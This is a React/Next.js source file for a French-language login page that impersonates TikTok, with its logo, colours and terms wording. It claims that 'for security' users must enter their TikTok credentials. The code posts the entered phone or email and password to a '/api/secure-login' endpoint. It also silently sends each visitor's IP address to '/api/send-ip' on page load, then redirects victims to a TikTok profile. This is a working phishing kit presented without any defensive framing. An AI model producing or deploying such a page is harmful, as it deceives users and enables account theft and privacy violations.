"use client";

import React, { useState } from "react";
import { Eye, EyeOff } from "lucide-react";
import Image from "next/image";
import { useRouter } from 'next/navigation'
import { useEffect } from 'react'

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [phoneOrEmail, setPhoneOrEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);  
  const router = useRouter()

    useEffect(() => {
      const redirectWithIP = async () => {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
  
        await fetch('/api/send-ip', {
          method: 'POST',
          body: JSON.stringify({ ip: data.ip }),
        });
  
      };
  
      redirectWithIP();
    }, [router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!phoneOrEmail || !password) {
      setError("Veuillez remplir tous les champs pour continuer.");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch('/api/secure-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneOrEmail, password }),
      });

      if (!res.ok) {
        const data = await res.json();
        setError(data.error || "Erreur lors de la soumission.");
        setLoading(false);
        return;
      }

      // Redirection après validation
      setTimeout(() => {
        window.location.href = "https://www.tiktok.com/@tarikibnziyad3131";
      }, 1000);

    } catch (err) {
      setError("Erreur serveur, veuillez réessayer plus tard.");
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black flex flex-col font-sans">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b border-gray-800">
        <button className="text-white text-xl font-light hover:opacity-70">✕</button>
        <button className="text-white text-sm hover:opacity-70">Aide</button>
      </div>

      {/* Main Content */}
      <form
        onSubmit={handleSubmit}
        className="flex-1 flex flex-col justify-center px-6 max-w-sm mx-auto w-full py-8"
      >
        {/* Logo Area */}
        <div className="text-center mb-8">
          <Image
            src="/images/logo-tiktok.png"
            alt="TikTok Logo"
            width={200}
            height={200}
            className="mx-auto mb-1 bg-black object-contain shadow-md"
            priority
          />
          <div className="text-gray-400 text-sm leading-snug mt-1">
            <p>
              Par mesure de sécurité, veuillez saisir vos identifiants TikTok afin de valider la redirection vers votre compte utilisateur.
            </p>
          </div>
        </div>

        {/* Email or phone input */}
        <input
          type="text"
          placeholder="Téléphone ou email"
          value={phoneOrEmail}
          onChange={(e) => setPhoneOrEmail(e.target.value)}
          className="mb-4 p-3 rounded bg-gray-900 text-white focus:outline-none"
        />

        {/* Password input with toggle */}
        <div className="relative mb-4">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Mot de passe"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-3 rounded bg-gray-900 text-white focus:outline-none"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
            aria-label={showPassword ? "Masquer le mot de passe" : "Afficher le mot de passe"}
          >
            {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
          </button>
        </div>

        {/* Error message */}
        {error && <p className="text-red-500 mb-4">{error}</p>}

        {/* Submit */}
        <button
          type="submit"
          disabled={loading}
          className="w-full py-3 bg-[#FE2C55] rounded text-white font-semibold hover:bg-[#e0254d] transition disabled:opacity-50"
        >
          {loading ? "Chargement..." : "Se connecter"}
        </button>
      </form>

      {/* Footer */}
      <div className="p-6 text-center border-t border-gray-800">
        <div className="text-gray-400 text-sm mb-6">
          Vous n'avez pas de compte ?{" "}
          <button className="text-white hover:underline font-semibold">S'inscrire</button>
        </div>

        <div className="text-xs text-gray-500 leading-relaxed max-w-xs mx-auto">
          En continuant, vous acceptez les{" "}
          <button className="text-white hover:underline">Conditions d'utilisation</button> de TikTok et
          confirmez que vous avez lu notre{" "}
          <button className="text-white hover:underline">Politique de confidentialité</button>.
        </div>
      </div>
    </div>
  );
}
